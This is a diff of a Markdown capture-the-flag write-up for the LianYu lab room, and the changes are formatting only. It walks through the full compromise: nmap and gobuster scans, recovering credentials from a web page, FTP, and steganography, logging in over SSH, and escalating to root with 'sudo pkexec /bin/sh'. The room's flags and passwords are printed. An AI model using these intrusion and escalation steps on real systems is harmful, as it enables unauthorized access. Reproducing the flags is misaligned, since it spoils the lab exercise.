@@ -6,7 +6,7 @@ pagination_prev: null
 
 ## Task 1: Find the Flags
 ### What is the Web Directory you found?
-- We can scan the target machine using `nmap`.
+We can scan the target machine using `nmap`.
 ```
 $ nmap -sC -sV 10.10.167.102
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 12:35 IST
@@ -40,7 +40,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.56 seconds
 ```
-- As we can see there are three open ports:
+As we can see there are three open ports:
 
 | Port | Service | 
 |--|--|
@@ -49,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.56 seconds
 | 80 | http | 
 | 111 | rpcbind |
 
-- Let's use `gobuster` to brute force the web pages.
+Let's use `gobuster` to brute force the web pages.
 ```
 $ gobuster dir -u http://10.10.167.102 -w /usr/share/wordlists/dirb/big.txt  
 ===============================================================
@@ -75,16 +75,17 @@ Progress: 20469 / 20470 (100.00%)
 Finished
 ===============================================================
 ```
-- Let's go to the `/island` webpage.
+Let's go to the `/island` webpage.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/dc2b49a4-62f3-416c-a7c4-64e50a6f9429)
 
-- We can view the page source using `CTRL+U`.
+We can view the page source using `CTRL+U`.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/3b5ef6dc-a9e6-4627-85b5-d07e87961c78)
 
-- So the username is `vigilante`.
-- For now, let's conduct a `gobuster` scan on `/island/` using another list.
+So the username is `vigilante`.
+
+For now, let's conduct a `gobuster` scan on `/island/` using another list.
 ```
 $ gobuster dir -u http://10.10.167.102/island -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt 
 ===============================================================
@@ -115,11 +116,11 @@ Finished
 &nbsp;
 
 ### what is the file name you found?
-- Let's visit the `/island/2100` page and check it's source.
+Let's visit the `/island/2100` page and check it's source.
 
 ![4](https://github.com/Knign/Write-ups/assets/110326359/1dd3a4e5-6d5c-4d49-a83c-49b17b1816a1)
 
-- Now that we know the file extension is `.ticket`, we can perform another `gobuster` scan.
+Now that we know the file extension is `.ticket`, we can perform another `gobuster` scan.
 ```
 $ gobuster dir -u http://10.10.167.102/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x ticket
 ===============================================================
@@ -148,18 +149,18 @@ green_arrow.ticket
 &nbsp;
 
 ### what is the FTP password?
-- Let's visit the `/island/2100/green_arrow.ticket` page.
+Let's visit the `/island/2100/green_arrow.ticket` page.
 
 ![5](https://github.com/Knign/Write-ups/assets/110326359/7584a57b-97d4-43a1-b865-bcb355a088f3)
 
 ```
 RTy8yhBQdscX
 ```
-- Let's decode the string using Cyberchef.
+Let's decode the string using Cyberchef.
 
 ![6](https://github.com/Knign/Write-ups/assets/110326359/83b49e60-62c7-4e8c-bf2b-6471c2068bad)
 
-- So the FTP password is `!#th3h00d`.
+So the FTP password is `!#th3h00d`.
 ### Answer
 ```
 !#th3h00d
@@ -168,7 +169,7 @@ RTy8yhBQdscX
 &nbsp;
 
 ### what is the file name with SSH password?
-- We can now use `vigilante` as the username and `!#th3h00d` as the password to login through FTP.
+We can now use `vigilante` as the username and `!#th3h00d` as the password to login through FTP.
 ```
 $ ftp vigilante@10.10.167.102
 Connected to 10.10.167.102.
@@ -180,7 +181,7 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
 ```
-- Let's look around for important files.
+Let's look around for important files.
 ```
 ftp> ls -la
 200 EPRT command successful. Consider using EPSV.
@@ -197,7 +198,7 @@ drwxr-xr-x    4 0        0            4096 May 01  2020 ..
 -rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
 226 Directory send OK.
 ```
-- We can download these files to our machine using the `get` command.
+We can download these files to our machine using the `get` command.
 ```
 ftp> get Leave_me_alone.png
 local: Leave_me_alone.png remote: Leave_me_alone.png
@@ -228,12 +229,13 @@ local: .other_user remote: .other_user
 226 Transfer complete.
 2483 bytes received in 00:00 (18.13 KiB/s)
 ```
-- Let's check out the images.
+Let's check out the images.
 
 ![7](https://github.com/Knign/Write-ups/assets/110326359/3cd49a83-77f1-456d-90c5-dc104276b395)
 
-- We can see that the `Leave_me_alone.png` file is not working properly.
-- Let's check its has dump.
+We can see that the `Leave_me_alone.png` file is not working properly.
+
+Let's check its has dump.
 ```
 $ xxd Leave_me_alone.png | head
 00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR
@@ -247,11 +249,11 @@ $ xxd Leave_me_alone.png | head
 00000080: 7d9d cfe7 f81e 5fcb 49ce ed94 7eb7 d8d7  }....._.I...~...
 00000090: 723c c9e9 7492 d3d3 494e c793 9c8f 8b2c  r<..t...IN.....,
 ```
-- So the first  8 characters are wrong. In a PNG file the first 8 characters should be `89 50 4E 47 0D 0A 1A 0A` as shown in this image:
+So the first  8 characters are wrong. In a PNG file the first 8 characters should be `89 50 4E 47 0D 0A 1A 0A` as shown in this image:
 
 ![8](https://github.com/Knign/Write-ups/assets/110326359/ba5b98c1-04ee-45b0-af5f-47823fc5377a)
 
-- Let's use `hexedit` to fix the bytes.
+Let's use `hexedit` to fix the bytes.
 ```
 $ hexedit Leave_me_alone.png
 ```
@@ -260,26 +262,27 @@ $ hexedit Leave_me_alone.png
 
 ![10](https://github.com/Knign/Write-ups/assets/110326359/48fe1a15-68ad-427a-a688-291faa1f4486)
 
-- The password for something is `password`.
-- Let's now extract the file in `aa.jpg` using this password.
+The password for something is `password`.
+
+Let's now extract the file in `aa.jpg` using this password.
 ```
 $ steghide extract -sf aa.jpg        
 Enter passphrase: 
 wrote extracted data to "ss.zip".
 ```
-- We can now `unzip` the ZIP file.
+We can now `unzip` the ZIP file.
 ```
 $ unzip ss.zip                        
 Archive:  ss.zip
   inflating: passwd.txt              
   inflating: shado  
 ```
-- Let's read the `shado` file.
+Let's read the `shado` file.
 ```
 $ cat shado      
 M3tahuman
 ```
-- Another password.
+Another password.
 ### Answer
 ```
 shado
@@ -288,7 +291,7 @@ shado
 &nbsp;
 
 ### user.txt
-- We also downloaded the `.other_user` file from the FTP server. Let's read that.
+We also downloaded the `.other_user` file from the FTP server. Let's read that.
 ```
 $ cat .other_user
 Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.
@@ -299,8 +302,9 @@ A criminal named the Jackal took his younger son Joseph Wilson hostage to force 
 
 After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.
 ```
-- So it seems like `M3tahuman` is the password for the user `slade`.
-- Let's try it out.
+So it seems like `M3tahuman` is the password for the user `slade`.
+
+Let's try it out.
 ```
 $ ssh slade@10.10.167.102    
 The authenticity of host '10.10.167.102 (10.10.167.102)' can't be established.
@@ -330,7 +334,7 @@ slade@10.10.167.102's password:
 
 slade@LianYu:~$ 
 ```
-- Let's get the flag inside `user.txt`.
+Let's get the flag inside `user.txt`.
 ```
 slade@LianYu:~$ ls
 user.txt
@@ -346,7 +350,7 @@ THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
 &nbsp;
 
 ### root.txt
-- Let's check what files `slade` can execute without the password.
+Let's check what files `slade` can execute without the password.
 ```
 slade@LianYu:~$ sudo -l
 [sudo] password for slade: 
@@ -356,7 +360,7 @@ Matching Defaults entries for slade on LianYu:
 User slade may run the following commands on LianYu:
     (root) PASSWD: /usr/bin/pkexec
 ```
-- We can go to GTFOBins to find an exploit.
+We can go to GTFOBins to find an exploit.
 
 ![11](https://github.com/Knign/Write-ups/assets/110326359/fe4c1949-886e-4e6e-9601-9f8702dc9f97)
 
@@ -364,7 +368,7 @@ User slade may run the following commands on LianYu:
 slade@LianYu:~$ sudo pkexec /bin/sh
 # 
 ```
-- We can now get the root flag.
+We can now get the root flag.
 ```
 # ls
 root.txt
